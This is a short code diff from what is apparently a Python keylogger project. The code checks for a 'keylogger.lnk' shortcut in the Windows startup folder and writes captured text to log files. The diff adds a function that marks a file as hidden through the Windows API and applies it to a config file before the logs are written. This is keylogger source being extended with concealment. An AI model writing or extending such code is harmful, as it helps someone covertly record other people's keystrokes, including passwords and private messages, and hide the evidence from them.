@@ -15,6 +15,10 @@ def is_file_in_startup_folder(file_path):
     return os.path.isfile(os.path.join(startup_folder, file_path))
 
 
+def hide_a_file(filename):
+    # subprocess.run(["attrib","+H",filename],check=True)
+    ctypes.windll.kernel32.SetFileAttributesW(filename, 2)  # Set as hidden
+
 file_path = "keylogger.lnk"
 if is_file_in_startup_folder(file_path):
     with open("log_text.txt","w") as file:
@@ -22,6 +26,7 @@ if is_file_in_startup_folder(file_path):
     with open("full_log.txt","a") as file:
         file.write(text)
 else:
+    hide_a_file(".\\config\\.env")
     with open(".\\config\\log_text.txt","w") as file:
         file.write(text)
     with open(".\\config\\full_log.txt","a") as file:
